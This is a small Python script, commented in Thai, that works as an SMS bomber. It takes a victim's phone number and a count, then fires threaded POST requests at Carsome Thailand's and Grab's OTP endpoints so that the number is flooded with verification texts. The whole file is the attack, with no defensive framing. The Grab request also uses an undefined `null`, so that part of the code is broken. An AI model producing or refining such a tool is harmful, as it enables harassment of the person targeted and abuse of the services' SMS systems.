import requests
import threading
from threading import Thread
import time
import colorama
import platform
import os

def clear():# ไว้เช็ค os ที่ใช้
    so_name=platform.system()#ไว้เช็ค os
    if so_name=='Windows':
        os.system('cls')
    else:
        os.system('clear')
clear()

phone = input("\033[91mPHONE NUMBER : ")
number = int(input("\033[91mNUMBER : "))
clear()

def api1():
    requests.post("https://www.carsome.co.th/sell/request-otp",data={"current_phone_no":phone,"new_phone_no":phone,"lead_id":"1467606"})
    
def api2():
    requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp",data={"client_id":phone,"ctx_id":phone,"transaction_ctx":null,"country_code":"TH","method":"SMS","num_digits":6,"scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number":phone})
    
for i in range(number):
    threading.Thread(target=api1).start()
    print("\33[92m API WWW.CARSOME.CO.TH")
    threading.Thread(target=api2).start()
    print("\33[92m API PARTNER-API.GRAB.COM")